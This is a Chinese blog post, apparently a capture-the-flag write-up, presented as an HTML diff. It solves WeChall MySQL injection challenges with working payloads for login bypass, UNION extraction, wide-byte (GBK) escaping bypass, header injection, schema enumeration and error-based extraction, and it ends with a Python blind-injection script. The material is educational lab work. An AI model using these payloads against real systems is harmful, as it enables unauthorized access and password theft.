@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon.png?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="SQLI,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="还剩几道题，解决完后再更新一下*  Training: MySQL I Training: MySQL II No Escape  Addslashes The Guestbook Table Names Table Name II MD5.SALT Order By Query Blinded by the light">
+<meta name="keywords" content="SQLI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Wechall MySQL Write up">
+<meta property="og:url" content="http://yoursite.com/2018/07/09/[Wechall] MySQL Writeup/index.html">
+<meta property="og:site_name" content="ht&#39;s blog">
+<meta property="og:description" content="还剩几道题，解决完后再更新一下*  Training: MySQL I Training: MySQL II No Escape  Addslashes The Guestbook Table Names Table Name II MD5.SALT Order By Query Blinded by the light">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-01-24T13:36:59.103Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Wechall MySQL Write up">
+<meta name="twitter:description" content="还剩几道题，解决完后再更新一下*  Training: MySQL I Training: MySQL II No Escape  Addslashes The Guestbook Table Names Table Name II MD5.SALT Order By Query Blinded by the light">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"remove","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/07/09/[Wechall] MySQL Writeup/">
+
+
+
+
+
+  <title>Wechall MySQL Write up | ht's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ht's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Record something</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/09/[Wechall] MySQL Writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ht">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ht's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Wechall MySQL Write up</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-09T00:00:00+08:00">
+                2018-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQLI/" itemprop="url" rel="index">
+                    <span itemprop="name">SQLI</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>还剩几道题，解决完后再更新一下*</p>
+<ul>
+<li><a href="#1">Training: MySQL I</a></li>
+<li><a href="#2">Training: MySQL II</a></li>
+<li><a href="#3">No Escape</a> </li>
+<li><a href="#4">Addslashes</a></li>
+<li><a href="#5">The Guestbook</a></li>
+<li><a href="#6">Table Names</a></li>
+<li><a href="#7">Table Name II</a></li>
+<li><a href="#8">MD5.SALT</a></li>
+<li><a href="#9">Order By Query</a></li>
+<li><a href="#10">Blinded by the light</a></li>
+</ul>
+<a id="more"></a>
+<blockquote>
+<p>识别MySQL注入漏洞，判断是否能将不可信的输入执行为控制指令的一部分？</p>
+<p>用单引号能够让字符串参数在查询时出错，通过进一步识别这些错误来判断是否真正存在注入？</p>
+</blockquote>
+<ol>
+<li><strong>Training: MySQL I</strong> </li>
+</ol>
+<p>   查看源码:</p>
+   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$password = md5($password);</span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='$username' AND password='$password'"</span>;</span><br></pre></td></tr></table></figure>
+<p>   查询中没有对 <strong>username</strong>  过滤，提交username: <code>admin&#39; --</code> </p>
+<p>   使查询语句变成 <code>SELECT * FROM users WHERE username=&#39;admin&#39; -- a AND password=&#39;$password&#39;</code>  </p>
+<p>   ​</p>
+<p>   “–”后面的内容会被注释掉，查询语句等价于:  <code>SELECT * FROM users WHERE username=&#39;admin&#39;</code>  </p>
+<p>   ​</p>
+<p>   从而作为 admin 登录。</p>
+<p>   <em>MySQL中 “–”注释符号后需要有空格才能生效，URL中末尾的空格会被忽略，所以有时候常用 “– a”</em></p>
+<p>   <em>这种注入估计只能时存在练习题里，还是不要想拿到实际的站去试了吧？</em></p>
+<ol start="2">
+<li><strong>Training: MySQL II</strong> </li>
+</ol>
+<pre><code>查看源码：
+</code></pre>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$password = md5($password);</span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='$username'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#增加了对password的检查</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result[<span class="string">'password'</span>] !== $password) &#123;</span><br><span class="line">	<span class="keyword">echo</span> GWF_HTML::error(<span class="string">'Auth2'</span>, $chall-&gt;lang(<span class="string">'err_password'</span>), <span class="keyword">false</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure>
+<p>   构造：</p>
+<p>   <strong>username</strong> ：<code>&#39;AND 1=2 UNION SELECT 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39; -- a</code></p>
+<p>   <strong>password</strong>：  <code>1</code></p>
+<p>   ​</p>
+<p>   使前面返回空，从而 <code>$result</code> 中得到我们构造的内容， admin 后的字符串是对数字 <strong>1</strong> 进行 md5 运算的结果。</p>
+<ol start="3">
+<li><p><strong>No Escape</strong></p>
+<p>​</p>
+<p>源码中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$who = GDO::escape($who);</span><br><span class="line">$query = <span class="string">"UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1"</span>;</span><br></pre></td></tr></table></figure>
+<p>​</p>
+<p>输入单引号 “ <strong>‘ </strong> ” 被转义之后，语句报错，发现变量<strong>$who</strong> 是用的反引号 “<strong>`</strong>”  ，试了一下反引号不会被转义，于是构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?vote_for=bill`=`bill`%<span class="number">2</span>b94 -- a</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+</ol>
+<ol start="4">
+<li><p><strong>Addslashes</strong></p>
+<p>​</p>
+</li>
+</ol>
+<pre><code>利用宽字节注入
+</code></pre><blockquote>
+<p>GBK, GB2312, GB18030, BIG5…即为常说的宽子节，一个字符占两个字节</p>
+<p>在MySQL5.x 处理字符过程中涉及到以下字符集信息：</p>
+<p>character_set_client:客户端发送过来的SQL语句编码</p>
+<p>character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。在之后进行内部操作的时候转码为内部字符集</p>
+<p>character_set_database:数据库缺省编码字符集</p>
+<p>character_set_results:SQL语句执行结果编码字符集</p>
+<p>character_set_server:服务器缺省编码字符集</p>
+<p>character_set_system:系统缺省编码字符集</p>
+<p>在character_set_client=GBK时，MySQL字符集使用character_set_client字符集进行编码过程发生宽子节的问题</p>
+<p>在宽子节中 ，首字节对应0x81-0xfe,尾子节0x40-0xfe，包含”\”对应的编码 0x5c</p>
+</blockquote>
+<p>我们输入 <code>%df%27</code> 时，addslashes，mysql_real_escape_string，mysql_escape_string等函数，在<code>%27</code> 前面添加 <code>%5c</code> ，输入变成   <code>%df%5c%27</code> , 此时MySQL使用 <code>character_set_client=GBK</code> 转换，<code>%df%5c</code>  对应一个汉字，使后面的引号保留</p>
+<p>   提交username：<code>%df%27 union select CHAR(65, 100, 109, 105, 110) -- a</code></p>
+<p>   <em>登录按钮为中文时 login参数编码有问题，改成随便的数字就可以</em></p>
+<ol start="5">
+<li><strong>The Guestbook</strong></li>
+</ol>
+<p>   查看源码：</p>
+<p>   ​</p>
+   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里没有对HTTP消息头检查</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gbook_getIP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">		<span class="keyword">return</span> $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_VIA'</span>])) &#123; </span><br><span class="line">		<span class="keyword">return</span> $_SERVER[<span class="string">'HTTP_VIA'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#SQL语句，对输入的message进行转义，但是前面没有对ip做限制，所以可以在X-FORWORDED-FOR注入</span></span><br><span class="line"></span><br><span class="line">$playerid = gbook_playerID(<span class="keyword">true</span>); <span class="comment">// Current Player</span></span><br><span class="line"></span><br><span class="line">$userid = <span class="number">0</span>; <span class="comment"># guestbook has no login yet.</span></span><br><span class="line"></span><br><span class="line">$time = time();</span><br><span class="line"></span><br><span class="line">$ip = gbook_getIP();</span><br><span class="line"></span><br><span class="line">$message = GDO::escape($message); </span><br><span class="line"></span><br><span class="line">$query = <span class="string">"INSERT INTO gbook_book VALUES('$playerid', $userid, $time, '$ip', '$message')"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出部分 时间，用户，ip 消息</span></span><br><span class="line"><span class="keyword">echo</span> sprintf(<span class="string">'&lt;td&gt;%s - %s - %s&lt;/td&gt;'</span>, GWF_Time::displayTimestamp($row[<span class="string">'gbb_time'</span>]), $username, $row[<span class="string">'gbb_ip'</span>]).PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> sprintf(<span class="string">'&lt;td&gt;%s&lt;/td&gt;'</span>, GWF_HTML::display($row[<span class="string">'gbb_msg'</span>])).PHP_EOL;</span><br></pre></td></tr></table></figure>
+<p>   推荐Fireworks插件Modify Headers 或者用Brup Suite拦截修改Header</p>
+<p>   <strong>X-FORWORDED-FOR：1’, (SELECT gbook_password FROM gbook_user WHERE gbu_name=’Admin’)) – a</strong> </p>
+<p>   从而得到flag：<code>TheBrownFoxAndTheLazyDog</code></p>
+<p>   ​</p>
+<ol start="6">
+<li><strong>Table Names</strong> </li>
+</ol>
+<p>   在username提交一个单引号，返回错误 <code>Database error in file core/inc/GDO/db/GDO_Database.php line 129.</code></p>
+<p>   为了提取库名和表名，先确定SQL返回的列数</p>
+<p>   ​</p>
+<p>   username：<code>test&#39;  order by 1 -- a</code> ，到4报错，确定有3列</p>
+<p>   ​</p>
+<p>   username：<code>&#39; union select 1,2,3 -- a</code> ，发现页面返回1，3，确定在这两个字段返回结果</p>
+<p>   ​</p>
+<p>   username：<code>&#39; union select 1,2,schema_name from information_schema.schemata limit 0,1 -- a</code> 找库名，limit  1,1 时发现 <code>gizmore_tableu61</code> </p>
+<p>   ​</p>
+<p>   username：<code>&#39; union select 1,2,table_name from information_schema.tables where table_schema=&#39;gizmore_tableu61&#39; limit 1,1 -- a</code> 找到表 <code>usertableus4</code></p>
+<p>   flag: <code>gizmore_tableu61_usertableus4</code></p>
+<p>   ​</p>
+<ol start="7">
+<li><strong>Table Name II</strong> </li>
+</ol>
+   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对输入检查，但是没有对 information_schema </span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/statistics|tables|columns|table_constraints|key_column_usage|partitions|schema_privileges|schemata|database|schema\(\)/i'</span>, $username.$password))&#123;</span><br><span class="line">		<span class="keyword">echo</span> GWF_HTML::error(GWF_PAGE_TITLE, $chall-&gt;lang(<span class="string">'on_match'</span>));</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">#查询语句</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM &#123;$secret['database']&#125;.&#123;$secret['table_name']&#125; WHERE username='$username' AND password='$password'"</span>;</span><br></pre></td></tr></table></figure>
+<p>   ​</p>
+<p>   在information_schema库中有个processlist表，这个表显示了哪些线程正在运行，和执行的查询语句</p>
+<p>   username：<code>&#39; union select 1,2,info from information_schema.processlist -- a</code> 得到</p>
+<p>   ​</p>
+<p>   Your personal welcome message is: SELECT * FROM<br>   nurfedtables37.userbobbytable7 WHERE username=’’ union select 1,2,info<br>   from information_schema.processlist – a’ AND password=’test’</p>
+<p>   ​</p>
+<ol start="8">
+<li><strong>MD5.SALT</strong></li>
+</ol>
+<p>   使用ORDER BY确认结果集返回2列,构造</p>
+<p>   ​</p>
+<p>   username：<code>&#39;union select password,1 from users where username=&#39;Admin&#39; -- a</code> </p>
+<p>   得到密码的MD5，去找个解密网站得到密码academicsalt21</p>
+<p>   ​</p>
+<ol start="9">
+<li><strong>Order By Query</strong> </li>
+</ol>
+<pre><code>``    $query = &quot;SELECT * FROM users ORDER BY $orderby $dir LIMIT 10&quot;;`` 
+</code></pre><p>   注入点在 $orderby， order by查询利用</p>
+<p>   ​</p>
+<p>   <code>by=3 and extractvalue(1, (select password from users where username=CHAR(65, 100, 109, 105, 110)))#</code></p>
+<p>   ​</p>
+<p>   <code>by=3 and extractvalue(1,concat(0x5c,(select password from users where username=CHAR(65, 100, 109, 105, 110))))#</code></p>
+<blockquote>
+<p>第一个查询中XPATH 返回的MD5 第一个是 3 没有被当作错误的参数，而返回了31个字符</p>
+<p>​</p>
+<p>第二个查询中，/ 处出现错误，返回从/开始的32个字符，因此需要把两次的结果拼接一下</p>
+</blockquote>
+<p>   ​</p>
+<ol start="10">
+<li><strong>Blinded by the light</strong></li>
+</ol>
+<pre><code>算是盲注了
+
+最开始打算把`password` 字段每一位MD5值转换为 4 bits，从而在 32 * 4 次查询得到MD5，但是某一处考虑错了，没能得到正确的值可能是conv()，或者是8 bits，最后用二分查找，4次一个字母，128次得到结果。
+
+
+
+附上.py
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(param)</span>:</span></span><br><span class="line">    url = <span class="string">'http://www.wechall.net/challenge/blind_light/index.php'</span></span><br><span class="line">    payload = &#123;<span class="string">'injection'</span>:param, <span class="string">'inject'</span>:<span class="string">'Inject'</span>&#125;</span><br><span class="line">    cookiee = &#123;<span class="string">'WC'</span>:<span class="string">'10379893-33882-qpWzjcIJxPdSrOiy'</span>&#125;</span><br><span class="line"></span><br><span class="line">    s = requests.post(url, data = payload, cookies = cookiee)</span><br><span class="line">    soup = BeautifulSoup(s.text,<span class="string">'html.parser'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">###如果[9]中没有返回的信息，那就在[13]##</span></span><br><span class="line">    answer = soup.find_all(<span class="string">'li'</span>)[<span class="number">13</span>]</span><br><span class="line">    <span class="comment">#answer = soup.find_all('li')[9]</span></span><br><span class="line">    answer = str(answer)</span><br><span class="line"></span><br><span class="line">    print(answer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> answer.find(<span class="string">'Welcome'</span>) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">words = <span class="string">"0123456789ABCDEF"</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    e = <span class="number">15</span></span><br><span class="line">    ii = str(i)</span><br><span class="line">    <span class="keyword">while</span>(f &lt; e):</span><br><span class="line">        <span class="keyword">if</span> (e - f == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> exploit(<span class="string">"\' or substring(password,"</span>+ ii +<span class="string">",1) = \'"</span>+ words[int(f)]):</span><br><span class="line">                m = f</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m = e</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">         </span><br><span class="line">        m = (f + e)/<span class="number">2</span></span><br><span class="line">        <span class="string">'''保留小数，int是向下取整'''</span></span><br><span class="line">        <span class="keyword">if</span> exploit(<span class="string">"\' or substring(password,"</span>+ ii +<span class="string">",1) &gt; \'"</span>+ words[int(m)]):</span><br><span class="line">            f = m + <span class="number">1</span></span><br><span class="line">            <span class="comment">#print(str(f)+"-"+str(e))</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            e = m</span><br><span class="line">            <span class="comment">#print(str(f)+":"+str(e))</span></span><br><span class="line">        </span><br><span class="line">        f = int(f)</span><br><span class="line">        e = int(e)</span><br><span class="line">    password = password+words[int(m)]</span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>
+
+​
+
+​
+</code></pre>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQLI/" rel="tag"># SQLI</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/05/网络设备组网应用4-不同VLAN间进行通信的路由配置/" rel="next" title="网络设备组网应用4-不同VLAN间进行通信的路由配置">
+                <i class="fa fa-chevron-left"></i> 网络设备组网应用4-不同VLAN间进行通信的路由配置
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/19/[Redtiger Hackit] Write up/" rel="prev" title="Redtiger Hackit Write up">
+                Redtiger Hackit Write up <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ht</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> </div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
